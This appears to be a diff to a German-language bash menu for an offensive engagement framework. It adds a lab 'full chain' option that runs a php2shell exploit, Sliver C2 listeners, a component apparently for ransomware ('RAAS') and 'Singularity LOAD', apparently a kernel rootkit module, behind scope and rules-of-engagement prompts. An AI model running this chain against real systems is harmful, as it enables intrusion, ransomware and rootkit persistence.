@@ -9,6 +9,7 @@ source "$ROOT/scripts/docker-env.sh"
 source "$ROOT/remote/lib/scope.sh"
 source "$ROOT/remote/lib/term.sh"
 source "$ROOT/remote/lib/state.sh"
+source "$ROOT/remote/lib/engage-lab-preset.sh"
 ORCH="$ROOT/remote/orchestrate.sh"
 
 hdr() {
@@ -53,6 +54,37 @@ cmd_scope() {
     echo "  → eingetragen."
     sleep 1
   fi
+}
+
+cmd_lab_full_load() {
+  hdr
+  cat <<'LAB'
+  ── Lab-Vollkette + Singularity LOAD (nur Docker-Lab / RoE) ──
+  FPM-Ziel (Default http://172.21.0.2/) · mod_php :19288 · Sliver · RAAS · LOAD (LKM)
+  Voraussetzung: vtbw-php2shell-lab up  (FPM-Target)
+LAB
+  echo
+  local url_def; url_def="$(engage_lab_default_url)"
+  read -r -p "  Ziel-URL [${url_def}]: " url
+  url="${url:-$url_def}"
+  read -r -p "  Listener-Port [4445]: " lport
+  lport="${lport:-4445}"
+  echo
+  echo "  Scope: $(engage_lab_default_url) → CIDR ${ENGAGE_LAB_SCOPE:-172.21.0.0/24}"
+  echo "  Singularity LOAD: CONFIRM VM-REBOOT-OK (Host-Kernel im Lab-Container)"
+  read -r -p "  Tippe VM-REBOOT-OK zum Start: " sconfirm
+  [[ "$sconfirm" != "VM-REBOOT-OK" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }
+  read -r -p "  RoE bestätigen — tippe ROE: " roe
+  [[ "$roe" != "ROE" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }
+
+  engage_lab_ensure_scope
+  engage_export_lab_full_load "$lport"
+  export TARGET_URL="$url"
+  echo
+  echo "  Starte Vollkette → $url (LHOST=$ENGAGE_LHOST:$ENGAGE_LPORT, Singularity=load)"
+  bash "$ORCH" run "$url"
+  echo
+  read -r -p "  ENTER für Menü… " _
 }
 
 cmd_run_wizard() {
@@ -283,7 +315,7 @@ SUB
       bash "$ROOT/scripts/lab-apache-up.sh"
       kit="$ROOT/third_party/zer061-php2shell/exploit.py"
       if [[ -f "$kit" ]]; then
-        python3 "$kit" -u "http://127.0.0.1:19288/index.php"
+        python3 "$kit" -u "${LAB_APACHE_URL:-http://127.0.0.1:19288/index.php}"
       fi
       ;;
   esac
@@ -318,6 +350,7 @@ main_loop() {
     cat <<'MENU'
     [1] Scope verwalten          scope-authorized.txt (RoE) anzeigen/eintragen
     [2] Engagement STARTEN       Wizard: URL · LHOST · Tor · Sliver · RAAS · Tunnel
+    [l] Lab-Vollkette + LOAD       172.21.0.2 · mod_php :19288 · Sliver · Singularity LOAD
     [3] Resume                   unterbrochene Session fortsetzen
     [4] Status                   alle Sessions + Phasen-Fortschritt
     [5] Listener neu spawnen     Fenster für bestehende Session erneut öffnen
@@ -335,6 +368,7 @@ MENU
     case "${c:-}" in
       1) cmd_scope ;;
       2) cmd_run_wizard ;;
+      l|L) cmd_lab_full_load ;;
       3) cmd_resume ;;
       4) cmd_status ;;
       5) cmd_listeners ;;
